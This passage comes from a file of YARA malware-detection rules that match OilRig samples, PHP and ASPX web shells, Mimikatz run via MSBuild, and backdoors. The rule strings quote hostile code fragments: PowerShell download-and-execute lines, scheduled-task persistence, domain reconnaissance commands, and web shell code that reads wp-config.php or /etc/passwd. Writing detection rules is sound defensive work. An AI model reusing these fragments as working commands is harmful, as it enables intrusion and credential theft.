hash1 = \"e17e1978563dc10b73fd54e7727cbbe95cc0b170a4e7bd0ab223e059f6c25fcc\"\n      tags = \"DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DownloadExecute=\\\"powershell \\\"\\\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(\" ascii\n      $x2 = \"-ExecutionPolicy Bypass -File \\\"&HOME&\\\"dns.ps1\\\"\" fullword ascii\n      $x3 = \"CreateObject(\\\"WScript.Shell\\\").Run Replace(DownloadExecute,\\\"-_\\\",\\\"bat\\\")\" fullword ascii\n      $x4 = \"CreateObject(\\\"WScript.Shell\\\").Run DnsCmd,0\" fullword ascii\n      $s1 = \"http://winodwsupdates.me\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4f48 and filesize < 4KB and 1 of them ) or ( 2 of them )\n}\n\nrule OilRig_Malware_Campaign_Gen2_RID31A9 : DEMO FILE G0049 MAL MIDDLE_EAST T1053_005 {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 13:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"c6437f57a8f290b5ec46b0933bfa8a328b0cb2c0c7fbeea7f21b770ce0250d3d\"\n      hash2 = \"293522e83aeebf185e653ac279bba202024cedb07abc94683930b74df51ce5cb\"\n      tags = \"DEMO, FILE, G0049, MAL, MIDDLE_EAST, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%userprofile%\\\\AppData\\\\Local\\\\Microsoft\\\\\" ascii\n      $s2 = \"$fdn=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('\" fullword ascii\n      $s3 = \"&{$rn = Get-Random; $id = 'TR\" fullword ascii\n      $s4 = \"') -replace '__',('DNS'+$id) | \" fullword ascii\n      $s5 = \"\\\\upd.vbs\" ascii\n      $s6 = \"schtasks /create /F /sc minute /mo \" fullword ascii\n      $s7 = \"') -replace '__',('HTP'+$id) | \" fullword ascii\n      $s8 = \"&{$rn = Get-Random -minimum 1 -maximum 10000; $id = 'AZ\" fullword ascii\n      $s9 = \"http://www.israirairlines.com/?mode=page&page=14635&lang=eng<\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 4000KB and 2 of ( $s* ) ) or ( 4 of them )\n}\n\nrule OilRig_Malware_Campaign_Gen3_RID31AA : DEMO FILE G0049 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 13:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5e9ddb25bde3719c392d08c13a295db418d7accd25d82d020b425052e7ba6dc9\"\n      hash2 = \"bd0920c8836541f58e0778b4b64527e5a5f2084405f73ee33110f7bc189da7a9\"\n      hash3 = \"90639c7423a329e304087428a01662cc06e2e9153299e37b1b1c90f6d0a195ed\"\n      tags = \"DEMO, FILE, G0049, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr\" fullword ascii\n      $x2 = \"\\\\Libraries\\\\fireueye.vbs\" ascii\n      $x3 = \"\\\\Libraries\\\\fireeye.vbs&\" wide\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and 1 of them )\n}\n\nrule OilRig_Malware_Campaign_Mal2_RID31A9 : DEMO FILE G0049 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 13:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"65920eaea00764a245acb58a3565941477b78a7bcc9efaec5bf811573084b6cf\"\n      tags = \"DEMO, FILE, G0049, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {(Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace '__',(Get-Random) | Set-C\" ascii\n      $x2 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n      $x3 = \"mailto:Mohammed.sarah@gratner.com\" fullword wide\n      $x4 = \"mailto:Tarik.Imam@gartner.com\" fullword wide\n      $x5 = \"Call Extract(DnsPs1, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\dns.ps1\\\")\" fullword ascii\n      $x6 = \"2dy53My5vcmcvMjAw\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0xcfd0 and filesize < 200KB and 1 of them )\n}\n\nrule OilRig_Campaign_Reconnaissance_RID32E1 : DEMO G0049 MAL MIDDLE_EAST T1016 T1033 T1087_002 {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 14:24:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5893eae26df8e15c1e0fa763bf88a1ae79484cdb488ba2fc382700ff2cfab80c\"\n      tags = \"DEMO, G0049, MAL, MIDDLE_EAST, T1016, T1033, T1087_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"whoami & hostname & ipconfig /all\" ascii\n      $s2 = \"net user /domain 2>&1 & net group /domain 2>&1\" ascii\n      $s3 = \"net group \\\"domain admins\\\" /domain 2>&1 & \" ascii\n   condition: \n      ( filesize < 1KB and 1 of them )\n}\n\nrule OilRig_Malware_Campaign_Mal3_RID31AA : DEMO G0049 MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Oilrig malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\"\n      date = \"2016-10-12 13:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"02226181f27dbf59af5377e39cf583db15200100eea712fcb6f55c0a2245a378\"\n      tags = \"DEMO, G0049, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"(Get-Content $env:Public\\\\Libraries\\\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\\\Libraries\\\\dns.ps1\" fullword ascii\n      $x2 = \"Invoke-Expression ($global:myhome+'tp\\\\'+$global:filename+'.bat > '+$global:myhome+'tp\\\\'+$global:filename+'.txt')\" fullword ascii\n      $x3 = \"('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\" fullword ascii\n   condition: \n      ( filesize < 10KB and 1 of them )\n}\n\nrule Unspecified_Malware_Oct16_A_RID3134 : DEMO EXE FILE MAL T1546_012 {\n   meta:\n      description = \"Detects an unspecififed malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:12:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d112a7e21902287e4a37112bf17d7c73a7b206e7bc81780fd87991c1519f38c8\"\n      tags = \"DEMO, EXE, FILE, MAL, T1546_012\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\system32\\\\%s.dll\" fullword ascii\n      $x2 = \"%SystemRoot%\\\\System32\\\\svch%s -k nets\" fullword ascii\n      $x3 = \"\\\\\\\\.\\\\pipe\\\\96DBA249-E88E-4c47-98DC-E18E6E3E3E5A\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\" fullword ascii\n      $s2 = \"boottemp.exe\" fullword ascii\n      $s3 = \"at \\\\\\\\%s %d:%d C:\\\\%s.exe\" fullword ascii\n      $s4 = \"cryptcom.dll\" fullword ascii\n      $s5 = \"Wininet.dll\" fullword ascii\n      $s6 = \"\\\\\\\\%s\\\\%s\\\\%s.exe\" fullword ascii\n      $s7 = \"%s%d.exe\" fullword ascii\n      $s8 = \"booter.exe\" fullword ascii\n      $s9 = \"\\\\\\\\%s\\\\pipe%s\" fullword ascii\n      $s10 = \"C:\\\\DelInfo.bin\" fullword ascii\n      $op0 = { ae 44 00 00 cb 44 00 00 dc 44 00 00 f5 44 00 00 } \n      $op1 = { ae 44 00 00 cb 44 00 00 dc 44 00 00 f5 44 00 00 } \n      $op2 = { ee 11 74 cf 73 0b 91 c4 c9 57 b2 d9 36 86 a5 b4 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 2 of ( $x* ) or 3 of ( $s* ) or all of ( $op* ) ) ) or ( 6 of them )\n}\n\nrule Sality_Malware_Oct16_RID2E9B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an unspecififed malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 11:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8eaff5e1d4b55dd6e25f007549271da10afd1fa25064d7105de0ca2735487aad\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Hello world!\" fullword wide\n      $s2 = \"[LordPE]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule Unspecified_Malware_Oct16_C_RID3136 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an unspecififed malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:12:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a451157f75627b2fef3d663946c94ef7dacb58f08b31d0ec4c0a542a1c4e6205\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dUSER32.DLL\" fullword wide\n      $s2 = \"output.dll\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them )\n}\n\nrule Bladabindi_Malware_B64_RID2F1E : DEMO EXE FILE MAL T1132_001 {\n   meta:\n      description = \"Detects Bladabindi Malware using Base64 encoded strings\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 11:43:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dda668b0792b7679979e61f2038cf9a8ec39415cc161be00d2c8301e7d48768d\"\n      tags = \"DEMO, EXE, FILE, MAL, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"XHN5c3RlbTMyXA==\" fullword ascii\n      $s2 = \"RXhlY3V0ZSBFUlJPUg==\" fullword ascii\n      $s3 = \"dHJvamFuLmV4ZQ==\" fullword ascii\n      $s4 = \"VXBkYXRlIEVSUk9S\" fullword ascii\n      $s5 = \"RG93bmxvYWQgRVJST1I=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule Dorkbot_Injector_Malware_RID30AB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Darkbot Injector\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 12:49:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"bc3c5ac7180c8ac21d6908d747aa6122154d2bb51bb99ff0e0b1c65088d275dc\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Enter an integer, a real number, a character and a string : \" fullword ascii\n      $s2 = \"ready to finish\" fullword ascii\n      $s3 = \"EYEnpw\" fullword ascii\n      $s4 = \"somewhere i belong\" fullword ascii\n      $s5 = \"Not all fields were assigned\" fullword ascii\n      $s6 = \"take down\" fullword ascii\n      $s7 = \"real number = %f\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 6 of them )\n}\n\nrule Unspecified_Malware_Oct16_D_RID3137 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unspecified malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cd5f3bc0176a6803093ffdea6a7442c416e0d2945b6903063d17f5bb8d17519d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\file.exe\" fullword wide\n      $s2 = \"new.exe\" fullword wide\n      $s3 = \"passwordIterations\" fullword ascii\n      $op0 = { 10 00 12 00 1a 00 05 00 01 00 01 00 01 00 10 00 } \n      $op1 = { 41 32 00 36 00 62 00 34 00 32 00 65 00 37 00 62 } \n      $op2 = { 3c 4d 6f 64 75 6c 65 3e 00 6e 65 77 2e 65 78 65 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( all of ( $s* ) or all of ( $op* ) )\n}\n\nrule Unspecified_Malware_Oct16_E_RID3138 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects unspecified Malware - October 2016\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-10-08 13:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"28093385130b61f22920c0ce6e56de1f2cd8eef589bebe2af31f36f51f2b4d01\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"P3pORt\" fullword ascii\n      $s2 = \"msdownld.tmp\" fullword ascii\n      $s3 = \"TMP4351$.TMP\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}\n\nrule MSBuild_Mimikatz_Execution_via_XML_RID3448 : DEMO S0002 SUSP T1003 T1127_001 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Detects an XML that executes Mimikatz on an endpoint via MSBuild\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml\"\n      date = \"2016-10-07 15:23:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, S0002, SUSP, T1003, T1127_001, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<Project ToolsVersion=\" ascii\n      $x2 = \"</SharpLauncher>\" fullword ascii\n      $s1 = \"\\\"TVqQAAMAAAA\" ascii\n      $s2 = \"System.Convert.FromBase64String(\" ascii\n      $s3 = \".Invoke(\" ascii\n      $s4 = \"Assembly.Load(\" ascii\n      $s5 = \".CreateInstance(\" ascii\n   condition: \n      all of them\n}\n\nrule Nishang_Webshell_RID2D6E : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a ASPX web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/samratashok/nishang\"\n      date = \"2016-09-11 10:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"psi.Arguments = \\\"-noninteractive \\\" + \\\"-executionpolicy bypass \\\" + arg;\" ascii\n      $s2 = \"output.Text += \\\"\\nPS> \\\" + console.Text + \\\"\\n\\\" + do_ps(console.Text);\" ascii\n      $s3 = \"<title>Antak Webshell</title>\" fullword ascii\n      $s4 = \"<asp:Button ID=\\\"executesql\\\" runat=\\\"server\\\" Text=\\\"Execute SQL Query\\\"\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x253C and filesize < 100KB and 1 of ( $s* ) )\n}\n\nrule UploadShell_98038f1efa4203432349badabad76d44337319a6_RID3657 : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"$lol = file_get_contents(\\\"../../../../../wp-config.php\\\");\" fullword ascii\n      $s6 = \"@unlink(\\\"./export-check-settings.php\\\");\" fullword ascii\n      $s7 = \"$xos = \\\"Safe-mode:[Safe-mode:\\\".$hsafemode.\\\"] \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )\n}\n\nrule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3_RID3552 : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<?php Error_Reporting(0); $s_pass = \\\"\" ascii\n      $s2 = \"$s_func=\\\"cr\\\".\\\"eat\\\".\\\"e_fun\\\".\\\"cti\\\".\\\"on\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3c0a and filesize < 300KB and all of them )\n}\n\nrule Unknown_8af033424f9590a15472a23cc3236e68070b952e_RID345B : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 15:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$check = $_SERVER['DOCUMENT_ROOT']\" fullword ascii\n      $s2 = \"$fp=fopen(\\\"$check\\\",\\\"w+\\\");\" fullword ascii\n      $s3 = \"fwrite($fp,base64_decode('\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6324 and filesize < 6KB and ( all of ( $s* ) ) ) or ( all of them )\n}\n\nrule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d_RID352C : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:01:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"DK Shell - Took the Best made it Better..!!\" fullword ascii\n      $x2 = \"preg_replace(\\\"/.*/e\\\",\\\"\\\\x65\\\\x76\\\\x61\\\\x6C\\\\x28\\\\x67\\\\x7A\\\\x69\\\\x6E\\\\x66\\\\x6C\\\\x61\\\\x74\\\\x65\\\\x28\\\\x62\\\\x61\\\\x73\\\\x65\\\\x36\\\\x\" ascii\n      $x3 = \"echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';\" fullword ascii\n      $s1 = \"echo '<form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\" name=\\\"uploader\\\" id=\\\"uploader\\\">';\" fullword ascii\n      $s9 = \"$x = $_GET[\\\"x\\\"];\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and filesize < 200KB and 1 of ( $x* ) ) or ( 3 of them )\n}\n\nrule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901_RID355F : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:10:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b1733cbb0eb3d440c4174cc67ca693ba92308ded5fc1069ed650c3c78b1da4bc\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"preg_replace(\\\"\\\\x2F\\\\x2E\\\\x2A\\\\x2F\\\\x65\\\",\\\"\\\\x65\\\\x76\\\\x61\\\\x6C\\\\x28\\\\x67\\\\x7A\\\\x69\\\\x6E\\\\x66\\\\x6C\\\\x61\\\\x74\\\\x65\\\\x28\\\\x62\\\\x\" ascii\n      $s2 = \"input[type=text], input[type=password]{\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6c3c and filesize < 80KB and all of them )\n}\n\nrule Webshell_e8eaf8da94012e866e51547cd63bb996379690bf_RID3586 : DEMO FILE SCRIPT T1087_001 T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"027544baa10259939780e97dc908bd43f0fb940510119fc4cce0883f3dd88275\"\n      tags = \"DEMO, FILE, SCRIPT, T1087_001, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"@exec('./bypass/ln -s /etc/passwd 1.php');\" fullword ascii\n      $x2 = \"echo \\\"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \\\";\" fullword ascii\n      $x3 = \"@exec('tar -xvf mysqldumper.tar.gz');\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x213c and filesize < 100KB and 1 of ( $x* ) ) or ( 2 of them )\n}\n\nrule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167_RID3522 : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 16:00:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$check = $_SERVER['DOCUMENT_ROOT'] . \\\"/libraries/lola.php\\\" ;\" fullword ascii\n      $s2 = \"$fp=fopen(\\\"$check\\\",\\\"w+\\\");\" fullword ascii\n      $s3 = \"fwrite($fp,base64_decode('\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6324 and filesize < 2KB and all of them )\n}\n\nrule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7_2_RID36D5 : DEMO FILE SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a web shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 17:12:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395\"\n      tags = \"DEMO, FILE, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"$default_charset='Wi'.'ndo.'.'ws-12'.'51';\" fullword ascii\n      $s9 = \"$mosimage_session = \\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them )\n}\n\nrule WebShell_Generic_1609_A_RID2F12 : DEMO FILE GEN T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects a PHP webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/bartblaze/PHP-backdoors\"\n      date = \"2016-09-10 11:41:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035\"\n      hash3 = \"69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e\"\n      tags = \"DEMO, FILE, GEN, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"return $qwery45234dws($b);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3f3c and 1 of them )\n}\n\nrule Pirpi_1609_B_RID2AE5 : DEMO EXE FILE G0022 MAL {\n   meta:\n      description = \"Detects Pirpi Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 09:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"498b98c02e19f4b03dc6a3a8b6ff8761ef2c0fedda846ced4b6f1c87b52468e7\"\n      tags = \"DEMO, EXE, FILE, G0022, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"tconn <ip> <port> //set temp connect value, and disconnect.\" fullword ascii\n      $s2 = \"E* ListenCheckSsl SslRecv fd(%d) Error ret:%d %d\" fullword ascii\n      $s3 = \"%s %s L* ListenCheckSsl fd(%d) SslV(-%d-)\" fullword ascii\n      $s4 = \"S:%d.%d-%d.%d V(%d.%d) Listen On %d Ok.\" fullword ascii\n      $s5 = \"E* ListenCheckSsl fd(%d) SslAccept Err %d\" fullword ascii\n      $s6 = \"%s-%s N110 Ssl Connect Ok(%s:%d).\" fullword ascii\n      $s7 = \"%s-%s N110 Basic Connect Ok(%s:%d).\" fullword ascii\n      $s8 = \"tconn <ip> <port>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 4 of them )\n}\n\nrule pstgdump_RID2A85 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects a tool used by APT groups - file pstgdump_RID2A85.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://community.broadcom.com/home\"\n      date = \"2016-09-08 06:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"65d48a2f868ff5757c10ed796e03621961954c523c71eac1c5e044862893a106\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\pstgdump_RID2A85.pdb\" ascii\n      $x2 = \"Failed to dump all protected storage items - see previous messages for details\" fullword ascii\n      $x3 = \"ptsgdump [-h][-q][-u Username][-p Password]\" fullword ascii\n      $x4 = \"Attempting to impersonate domain user '%s' in domain '%s'\" fullword ascii\n      $x5 = \"Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d\" fullword ascii\n      $x6 = \"Unable to obtain handle to PStoreCreateInstance in pstorec.dll\" 